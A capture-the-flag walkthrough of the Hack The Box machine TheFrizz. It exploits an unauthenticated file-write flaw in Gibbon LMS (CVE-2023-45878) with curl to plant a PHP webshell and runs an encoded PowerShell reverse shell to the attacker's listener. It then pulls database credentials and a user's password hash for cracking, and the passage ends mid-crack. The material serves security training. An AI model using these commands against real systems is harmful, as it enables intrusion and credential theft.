---
maquina: "TheFrizz"
dificultad: "Medium"
os: "Windows"
plataforma: "htb"
release: "15 Mar 2025"
retire: "23 Aug 2025"
creadores: "0xPizzaCat"
htb_url: "https://hackthebox.com/machines/thefrizz"
app_url: "https://app.hackthebox.com/machines/652"
url: "https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html"
tipo: "htb"
en_lista_oscp: true
oscp_seccion: "htb"
---

TheFrizz starts with a Gibbons learning management platform that has a file write vulnerability that allows me to write a webshell and get a foothold on the box. I’ll grab a hash and salt from the database and crack that to move to the next user, connecting over SSH using Kerberos for auth. I’ll find an archive files for a WAPT install in the RecycleBin, and recover that to get a password for the next user. That user can edit group policy objects (GPOs), which I’ll abuse to get a shell as SYSTEM.

## Recon

### nmap

`nmap` finds man open TCP ports:

```console
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.60
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 20:10 UTC
Nmap scan report for 10.10.11.60
Host is up (0.15s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49677/tcp open  unknown
57981/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.59 seconds
oxdf@hacky$ nmap -p 22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -sCV 10.10.11.60
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 20:11 UTC
Nmap scan report for 10.10.11.60
Host is up (0.088s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 bb:0a:a2:1b:fc:7e:6e:3b:40:bb:e0:46:6a:b5:04:83 (RSA)
|   256 13:fc:a8:64:a2:84:9b:7c:71:75:a0:9d:e6:61:9c:64 (ECDSA)
|_  256 1b:7c:c9:69:18:90:f3:15:06:a9:85:11:71:45:96:8b (ED25519)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-08 03:12:16Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-03-08T03:12:29
|_  start_date: N/A
|_clock-skew: 7h00m18s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.76 seconds
```

There’s a few things to note:

- SSH (22) is interesting for a Windows machine. If I get creds, I’ll be sure to check for a shell.
- DNS (53) + Kerberos (88) + LDAP (389, 3268, etc) suggest a domain controller.
- The webserver is redirecting to `frizzdc.frizz.htb`. The LDAP ports are also showing the `frizz.htb` domain. I’ll fuzz the webserver for any subdomains of `frizz.htb` and `frizzdc.frizz.htb` that respond differently, but not find any. I’ll use `netexec` to generate an entry for my `hosts` file: `oxdf@hacky$ netexec smb frizzdc.frizz.htb --generate-hosts-file hosts SMB 10.10.11.60 445 frizzdc [*] x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False) oxdf@hacky$ cat hosts /etc/hosts | sudo sponge /etc/hosts oxdf@hacky$ head -1 /etc/hosts 10.10.11.60 frizzdc.frizz.htb frizz.htb frizzdc` The order matters here, as I’ll talk about below.
- The clock skew is off by seven hours from my host. I’ll keep that in mind if I go for any Kerberos attacks or auth.

### Website - TCP 80

#### Site

The site is for the Walkerville Elementary School:

![image-20250307152012723](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250307152012723.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

Most of the links go to other places on the page. There’s a link at the top right to “Pricing” that leads to `/pricing.html`. There’s nothing interesting on this page.

The “Staff Login” button goes to `/Gibbon-LMS/`, which is the login page for an instance of [Gibbon](https://gibbonedu.org/), a educational platform:

![image-20250307152255767](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250307152255767.png)

#### Tech Stack

Most of the site seems to use `.html` extensions, suggesting a static site. However, `/Gibbon-LMS/` is an instance of Gibbon, which runs on PHP (loading `/Gibbon-LMS/index.php` works). The footer says Gibbon is version v25.0.00.

The 404 page (both inside the Gibbon folder and at the root) is the [default Apache 404](https://0xdf.gitlab.io/cheatsheets/404#apache--httpd):

![image-20250307152601546](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250307152601546.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, giving it a lowercase wordlist as it is Windows and isn’t case-sensitive:

```console
oxdf@hacky$ feroxbuster -u http://frizzdc.frizz.htb --dont-extract-links -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://frizzdc.frizz.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       33w      303c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       30w      306c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        9l       28w      321c http://frizzdc.frizz.htb/ => http://frizzdc.frizz.htb/home/
301      GET        9l       30w      345c http://frizzdc.frizz.htb/home => http://frizzdc.frizz.htb/home/
301      GET        9l       30w      352c http://frizzdc.frizz.htb/home/images => http://frizzdc.frizz.htb/home/images/
301      GET        9l       30w      348c http://frizzdc.frizz.htb/home/js => http://frizzdc.frizz.htb/home/js/
301      GET        9l       30w      349c http://frizzdc.frizz.htb/home/css => http://frizzdc.frizz.htb/home/css/
301      GET        9l       30w      351c http://frizzdc.frizz.htb/home/fonts => http://frizzdc.frizz.htb/home/fonts/
[####################] - 6m    159504/159504  0s      found:6       errors:9218
[####################] - 5m     26584/26584   91/s    http://frizzdc.frizz.htb/
[####################] - 5m     26584/26584   81/s    http://frizzdc.frizz.htb/home/
[####################] - 6m     26584/26584   80/s    http://frizzdc.frizz.htb/home/images/
[####################] - 5m     26584/26584   83/s    http://frizzdc.frizz.htb/home/js/
[####################] - 5m     26584/26584   82/s    http://frizzdc.frizz.htb/home/css/
[####################] - 6m     26584/26584   80/s    http://frizzdc.frizz.htb/home/fonts/
```

It doesn’t find anything I don’t already know about.

### SMB - TCP 445

`netexec` shows that NTLM is disabled, and it doesn’t call out the guest account (which I’ve configured it to check using [this new feature](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon)):

```console
oxdf@hacky$ netexec smb 10.10.11.60
SMB         10.10.11.60     445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
```

Because NTLM is disabled, any attempt to authenticate with it returns `STATUS_NOT_SUPPORTED`:

```console
oxdf@hacky$ netexec smb 10.10.11.60 -u guest -p '' --shares
SMB         10.10.11.60     445    10.10.11.60      [*]  x64 (name:10.10.11.60) (domain:10.10.11.60) (signing:True) (SMBv1:False)
SMB         10.10.11.60     445    10.10.11.60      [-] 10.10.11.60\guest: STATUS_NOT_SUPPORTED
oxdf@hacky$ netexec smb 10.10.11.60 -u oxdf -p '' --shares
SMB         10.10.11.60     445    10.10.11.60      [*]  x64 (name:10.10.11.60) (domain:10.10.11.60) (signing:True) (SMBv1:False)
SMB         10.10.11.60     445    10.10.11.60      [-] 10.10.11.60\oxdf: STATUS_NOT_SUPPORTED
```

I can try with `-k`, but it fails unsurprisingly without legit creds:

```console
oxdf@hacky$ netexec smb frizzdc.frizz.htb -u guest -p '' -k
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\guest: KDC_ERR_CLIENT_REVOKED
oxdf@hacky$ netexec smb frizzdc.frizz.htb -u oxdf -p '' -k
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\oxdf: KDC_ERR_C_PRINCIPAL_UNKNOWN
```

I’ll need creds to continue here.

## Shell as w.webservice

### Identify CVE-2023-45878

Searching for “gibbon v25.0.00 cve” returns a bunch of different CVEs:

![image-20250307154710446](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250307154710446.png)

There’s a bunch of vulnerabilities including LFI and XSS to look at here, but the one that jumps out as most interesting is [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878), as it allows for unauthenticated RCE:

> GibbonEdu Gibbon version 25.0.1 and before allows Arbitrary File Write because rubrics_visualise_saveAjax.phps does not require authentication. The endpoint accepts the img, path, and gibbonPersonID parameters. The img parameter is expected to be a base64 encoded image. If the path parameter is set, the defined path is used as the destination folder, concatenated with the absolute path of the installation directory. The content of the img parameter is base64 decoded and written to the defined file path. This allows creation of PHP files that permit Remote Code Execution (unauthenticated).

### CVE-2023-45878 Details

[This post](https://herolab.usd.de/security-advisories/usd-2023-0025/) from usd HeroLab goes into details about how this vulnerability works. There is a PHP page in the Rubrics module, `rubrics_visualise_saveAjax.php` that can be accessed by unauthenticated users.

There are two POST parameters in this code that are important to the exploit, `img` and `path`. Both are loaded in code on [line 22](https://github.com/GibbonEdu/core/blob/16638b849220dd24ed1e536b44b76e222ae0f6c0/modules/Rubrics/rubrics_visualise_saveAjax.php#L22-L23) of the source:

```php
$img = $_POST['img'] ?? null;
$imgPath = $_POST['path'] ?? null;
```

For the `img` parameter, it is expecting something similar to the [data URI](https://en.wikipedia.org/wiki/Data_URI_scheme) scheme, but this one includes a name as well:

```plaintext
[mime type];[name],[base64 encoded image]
image/png;asdf,iVBORw0KGgoAAAANSUhEUgAAA...
```

On [lines 32-34](https://github.com/GibbonEdu/core/blob/16638b849220dd24ed1e536b44b76e222ae0f6c0/modules/Rubrics/rubrics_visualise_saveAjax.php#L32-L34) it splits the parameter on `;` and then `,`, and then base64-decodes:

```php
list($type, $img) = explode(';', $img);
list(, $img)      = explode(',', $img);
$img = base64_decode($img);
```

On [lines 49-51](https://github.com/GibbonEdu/core/blob/16638b849220dd24ed1e536b44b76e222ae0f6c0/modules/Rubrics/rubrics_visualise_saveAjax.php#L49-L51) it writes that raw image to a file based on the `path` input:

```php
$fp = fopen($absolutePath.'/'.$imgPath, 'w');
fwrite($fp, $img);
fclose($fp);
```

There’s no validating that what was decoded is an image, or doesn’t have PHP code in it.

### File Write POC

This file is present and accessible on TheFrizz:

```console
oxdf@hacky$ curl -v http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php
* Host frizzdc.frizz.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.60
*   Trying 10.10.11.60:80...
* Connected to frizzdc.frizz.htb (10.10.11.60) port 80
> GET /Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php HTTP/1.1
> Host: frizzdc.frizz.htb
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Sat, 08 Mar 2025 04:22:07 GMT
< Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
< Set-Cookie: G60fa1cd0af7be78b=19g945f9oqbf0k3feeffl5cr2i; path=/; HttpOnly; SameSite=Lax
< X-Frame-Options: SAMEORIGIN
< Pragma: no-cache
< Cache-Control: max-age=0, no-cache, no-store, must-revalidate
< Expires: Thu, 1 Jan 1970 00:00:00 GMT
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host frizzdc.frizz.htb left intact
```

I’ll create some base64-encoded data:

```console
oxdf@hacky$ echo '0xdf was here!' | base64
MHhkZiB3YXMgaGVyZSEK
```

Now I’ll POST in the format described above, including a `gibbonPersonID` (or it won’t work):

```console
oxdf@hacky$ curl http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php -d 'img=image/png;0xdf,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'
poc.php
```

It works:

```console
oxdf@hacky$ curl http://frizzdc.frizz.htb/Gibbon-LMS/poc.php
0xdf was here!
```

### Webshell

I’ll create a new base64-encoded payload that is a PHP webshell:

```console
oxdf@hacky$ echo '<?php  system($_GET["cmd"]);  ?>' | base64
PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyAgPz4K
```

I’ve added some spaces to get rid of any characters that might require encoding. Now I’ll upload this, updating the `path` and `img` parameters:

```console
oxdf@hacky$ curl http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php -d 'img=image/png;0xdf,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyAgPz4K&path=0xdf.php&gibbonPersonID=0000000001'
0xdf.php
```

It works:

```console
oxdf@hacky$ curl http://frizzdc.frizz.htb/Gibbon-LMS/0xdf.php?cmd=whoami
frizz\w.webservice
```

### Shell

I’ll grab a PowerShell #3 (Base64) shell from [revshells.com](https://www.revshells.com/). I’ll give it URL Encoding, and paste the result into the webshell:

```console
oxdf@hacky$ curl 'http://frizzdc.frizz.htb/Gibbon-LMS/0xdf.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwA5ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D'
```

In another terminal, at `nc`, there’s a shell:

```console
oxdf@hacky$ sudo rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.60 64273

PS C:\xampp\htdocs\Gibbon-LMS>
```

I’m using `rlwrap` to get a more solid shell on Windows.

## Shell as f.frizzle

### Enumeration

#### Home Directories

`w.webservice` does have a home directory in `C:\Users\`, but it’s very empty. Interestingly, this user can’t list directories in `C:\Users`:

```console
PS C:\Users> ls
PS C:\Users> ls 2>&1
ls : Access to the path 'C:\Users' is denied.
At line:1 char:1
+ ls 2>&1
+ ~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

#### WebServer

There website is hosted from `C:\xampp\htdocs`:

```console
PS C:\xampp\htdocs> ls

    Directory: C:\xampp\htdocs

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/7/2025   8:43 PM                Gibbon-LMS
d-----         2/25/2025   1:09 PM                home
```

`home` has just static pages as suspected.

In `Gibbon-LMS` there’s a `config.php` file with the database connection information:

```console
PS C:\xampp\htdocs\Gibbon-LMS> type config.php
...[snip]...
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
...[snip]...
```

#### Database

In `C:\xampp\mysql\bin` there’s a `mysql.exe` file. From this shell, I can’t get an interactive session with it, but I can run single commands:

```console
PS C:\> \xampp\mysql\bin\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "SHOW DATABASES;"
Database
gibbon
information_schema
test
```

The `test` database doesn’t have any tables, but the `gibbon` one has a ton:

```console
PS C:\> \xampp\mysql\bin\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" test -e "SHOW TABLES;"
PS C:\> \xampp\mysql\bin\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "SHOW TABLES;"
Tables_in_gibbon
gibbonaction
gibbonactivity
gibbonactivityattendance
gibbonactivityslot
gibbonactivitystaff
gibbonactivitystudent
gibbonactivitytype
gibbonadmissionsaccount
gibbonadmissionsapplication
gibbonalarm
gibbonalarmconfirm
gibbonalertlevel
gibbonapplicationform
gibbonapplicationformfile
gibbonapplicationformlink
gibbonapplicationformrelationship
gibbonattendancecode
gibbonattendancelogcourseclass
gibbonattendancelogformgroup
gibbonattendancelogperson
gibbonbehaviour
gibbonbehaviourletter
gibboncountry
gibboncourse
gibboncourseclass
gibboncourseclassmap
gibboncourseclassperson
gibboncrowdassessdiscuss
gibboncustomfield
gibbondataretention
gibbondaysofweek
gibbondepartment
gibbondepartmentresource
gibbondepartmentstaff
gibbondiscussion
gibbondistrict
gibbonemailtemplate
gibbonexternalassessment
gibbonexternalassessmentfield
gibbonexternalassessmentstudent
gibbonexternalassessmentstudententry
gibbonfamily
gibbonfamilyadult
gibbonfamilychild
gibbonfamilyrelationship
gibbonfamilyupdate
gibbonfileextension
gibbonfinancebillingschedule
gibbonfinancebudget
gibbonfinancebudgetcycle
gibbonfinancebudgetcycleallocation
gibbonfinancebudgetperson
gibbonfinanceexpense
gibbonfinanceexpenseapprover
gibbonfinanceexpenselog
gibbonfinancefee
gibbonfinancefeecategory
gibbonfinanceinvoice
gibbonfinanceinvoicee
gibbonfinanceinvoiceeupdate
gibbonfinanceinvoicefee
gibbonfirstaid
gibbonfirstaidfollowup
gibbonform
gibbonformfield
gibbonformgroup
gibbonformpage
gibbonformsubmission
gibbonformupload
gibbongroup
gibbongroupperson
gibbonhook
gibbonhouse
gibboni18n
gibbonin
gibboninarchive
gibboninassistant
gibbonindescriptor
gibbonininvestigation
gibbonininvestigationcontribution
gibboninpersondescriptor
gibboninternalassessmentcolumn
gibboninternalassessmententry
gibbonlanguage
gibbonlibraryitem
gibbonlibraryitemevent
gibbonlibrarytype
gibbonlog
gibbonmarkbookcolumn
gibbonmarkbookentry
gibbonmarkbooktarget
gibbonmarkbookweight
gibbonmedicalcondition
gibbonmessenger
gibbonmessengercannedresponse
gibbonmessengerreceipt
gibbonmessengertarget
gibbonmigration
gibbonmodule
gibbonnotification
gibbonnotificationevent
gibbonnotificationlistener
gibbonoutcome
gibbonpayment
gibbonpermission
gibbonperson
gibbonpersonaldocument
gibbonpersonaldocumenttype
gibbonpersonmedical
gibbonpersonmedicalcondition
gibbonpersonmedicalconditionupdate
gibbonpersonmedicalupdate
gibbonpersonreset
gibbonpersonstatuslog
gibbonpersonupdate
gibbonplannerentry
gibbonplannerentrydiscuss
gibbonplannerentryguest
gibbonplannerentryhomework
gibbonplannerentryoutcome
gibbonplannerentrystudenthomework
gibbonplannerentrystudenttracker
gibbonplannerparentweeklyemailsummary
gibbonreport
gibbonreportarchive
gibbonreportarchiveentry
gibbonreportingaccess
gibbonreportingcriteria
gibbonreportingcriteriatype
gibbonreportingcycle
gibbonreportingprogress
gibbonreportingproof
gibbonreportingscope
gibbonreportingvalue
gibbonreportprototypesection
gibbonreporttemplate
gibbonreporttemplatefont
gibbonreporttemplatesection
gibbonresource
gibbonresourcetag
gibbonrole
gibbonrubric
gibbonrubriccell
gibbonrubriccolumn
gibbonrubricentry
gibbonrubricrow
gibbonscale
gibbonscalegrade
gibbonschoolyear
gibbonschoolyearspecialday
gibbonschoolyearterm
gibbonsession
gibbonsetting
gibbonspace
gibbonspaceperson
gibbonstaff
gibbonstaffabsence
gibbonstaffabsencedate
gibbonstaffabsencetype
gibbonstaffapplicationform
gibbonstaffapplicationformfile
gibbonstaffcontract
gibbonstaffcoverage
gibbonstaffcoveragedate
gibbonstaffduty
gibbonstaffdutyperson
gibbonstaffjobopening
gibbonstaffupdate
gibbonstring
gibbonstudentenrolment
gibbonstudentnote
gibbonstudentnotecategory
gibbonsubstitute
gibbontheme
gibbontt
gibbonttcolumn
gibbonttcolumnrow
gibbonttday
gibbonttdaydate
gibbonttdayrowclass
gibbonttdayrowclassexception
gibbonttimport
gibbonttspacebooking
gibbonttspacechange
gibbonunit
gibbonunitblock
gibbonunitclass
gibbonunitclassblock
gibbonunitoutcome
gibbonusernameformat
gibbonyeargroup
```

The table with users in it is `gibbonperson`. It’s got a ton of columns:

```console
PS C:\> \xampp\mysql\bin\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "describe gibbonperson;"
Field   Type    Null    Key     Default Extra
gibbonPersonID  int(10) unsigned zerofill       NO      PRI     NULL    auto_increment
title   varchar(5)      NO              NULL
surname varchar(60)     NO
firstName       varchar(60)     NO
preferredName   varchar(60)     NO
officialName    varchar(150)    NO              NULL
nameInCharacters        varchar(60)     NO              NULL
gender  enum('M','F','Other','Unspecified')     NO              Unspecified
username        varchar(20)     NO      UNI     NULL
passwordStrong  varchar(255)    NO              NULL
passwordStrongSalt      varchar(255)    NO              NULL
passwordForceReset      enum('N','Y')   NO              N
status  enum('Full','Expected','Left','Pending Approval')       NO              Full
canLogin        enum('Y','N')   NO              Y
gibbonRoleIDPrimary     int(3) unsigned zerofill        NO              NULL
gibbonRoleIDAll varchar(255)    NO              NULL
dob     date    YES             NULL
email   varchar(75)     YES             NULL
emailAlternate  varchar(75)     YES             NULL
image_240       varchar(255)    YES             NULL
lastIPAddress   varchar(15)     NO
lastTimestamp   timestamp       YES             NULL
lastFailIPAddress       varchar(15)     YES             NULL
lastFailTimestamp       timestamp       YES             NULL
failCount       int(1)  YES             0
address1        mediumtext      NO              NULL
address1District        varchar(255)    NO              NULL
address1Country varchar(255)    NO              NULL
address2        mediumtext      NO              NULL
address2District        varchar(255)    NO              NULL
address2Country varchar(255)    NO              NULL
phone1Type      enum('','Mobile','Home','Work','Fax','Pager','Other')   NO
phone1CountryCode       varchar(7)      NO              NULL
phone1  varchar(20)     NO              NULL
phone3Type      enum('','Mobile','Home','Work','Fax','Pager','Other')   NO
phone3CountryCode       varchar(7)      NO              NULL
phone3  varchar(20)     NO              NULL
phone2Type      enum('','Mobile','Home','Work','Fax','Pager','Other')   NO
phone2CountryCode       varchar(7)      NO              NULL
phone2  varchar(20)     NO              NULL
phone4Type      enum('','Mobile','Home','Work','Fax','Pager','Other')   NO
phone4CountryCode       varchar(7)      NO              NULL
phone4  varchar(20)     NO              NULL
website varchar(255)    NO              NULL
languageFirst   varchar(30)     NO              NULL
languageSecond  varchar(30)     NO              NULL
languageThird   varchar(30)     NO              NULL
countryOfBirth  varchar(30)     NO              NULL
birthCertificateScan    varchar(255)    NO              NULL
ethnicity       varchar(255)    NO              NULL
religion        varchar(30)     NO              NULL
profession      varchar(90)     NO              NULL
employer        varchar(90)     NO              NULL
jobTitle        varchar(90)     NO              NULL
emergency1Name  varchar(90)     NO              NULL
emergency1Number1       varchar(30)     NO              NULL
emergency1Number2       varchar(30)     NO              NULL
emergency1Relationship  varchar(30)     NO              NULL
emergency2Name  varchar(90)     NO              NULL
emergency2Number1       varchar(30)     NO              NULL
emergency2Number2       varchar(30)     NO              NULL
emergency2Relationship  varchar(30)     NO              NULL
gibbonHouseID   int(3) unsigned zerofill        YES             NULL
studentID       varchar(15)     NO              NULL
dateStart       date    YES             NULL
dateEnd date    YES             NULL
gibbonSchoolYearIDClassOf       int(3) unsigned zerofill        YES             NULL
lastSchool      varchar(100)    NO              NULL
nextSchool      varchar(100)    NO              NULL
departureReason varchar(50)     NO              NULL
transport       varchar(255)    NO              NULL
transportNotes  text    NO              NULL
calendarFeedPersonal    text    NO              NULL
viewCalendarSchool      enum('Y','N')   NO              Y
viewCalendarPersonal    enum('Y','N')   NO              Y
viewCalendarSpaceBooking        enum('Y','N')   NO              N
gibbonApplicationFormID int(12) unsigned zerofill       YES             NULL
lockerNumber    varchar(20)     NO              NULL
vehicleRegistration     varchar(20)     NO              NULL
personalBackground      varchar(255)    NO              NULL
messengerLastRead       datetime        YES             NULL
privacy text    YES             NULL
dayType varchar(255)    YES             NULL
gibbonThemeIDPersonal   int(4) unsigned zerofill        YES             NULL
gibboni18nIDPersonal    int(4) unsigned zerofill        YES             NULL
studentAgreements       text    YES             NULL
googleAPIRefreshToken   text    NO              NULL
microsoftAPIRefreshToken        text    NO              NULL
genericAPIRefreshToken  text    NO              NULL
receiveNotificationEmails       enum('Y','N')   NO              Y
mfaSecret       varchar(16)     YES             NULL
mfaToken        text    YES             NULL
cookieConsent   enum('Y','N')   YES             NULL
fields  text    NO              NULL
```

I’ll grab the `username`, `passwordStrong`, and `passwordStrongSalt` fields:

```console
PS C:\> \xampp\mysql\bin\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "select username,passwordStrong,passwordStrongSalt from gibbonperson;"
username        passwordStrong  passwordStrongSalt
f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489
```

### Crack Hash

#### Format Hash

The hash is 64 hex characters, which is likely salted SHA256. `hashcat` can take this in the format `<hash>:<salt>`. If I pass that, autodetect will identify several formats:

```console
$ cat f.frizzle.hash
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489
$ hashcat f.frizzle.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
The following 12 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1410 | sha256($pass.$salt)                                        | Raw Hash salted and/or iterated
   1420 | sha256($salt.$pass)                                        | Raw Hash salted and/or iterated
  22300 | sha256($salt.$pass.$salt)                                  | Raw Hash salted and/or iterated
  20720 | sha256($salt.sha256($pass))                                | Raw Hash salted and/or iterated
  21420 | sha256($salt.sha256_bin($pass))                            | Raw Hash salted and/or iterated
   1440 | sha256($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
  20710 | sha256(sha256($pass).$salt)                                | Raw Hash salted and/or iterated
   1430 | sha256(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
   1450 | HMAC-SHA256 (key = $pass)                                  | Raw Hash authenticated
